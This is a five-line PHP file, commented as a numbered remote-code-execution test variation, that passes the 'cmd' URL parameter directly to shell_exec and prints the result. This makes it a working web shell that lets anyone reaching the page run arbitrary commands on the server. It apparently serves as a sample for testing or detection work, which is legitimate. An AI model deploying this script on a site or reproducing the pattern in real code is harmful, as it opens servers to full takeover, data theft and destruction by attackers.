<?php
// RCE test variation #90
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>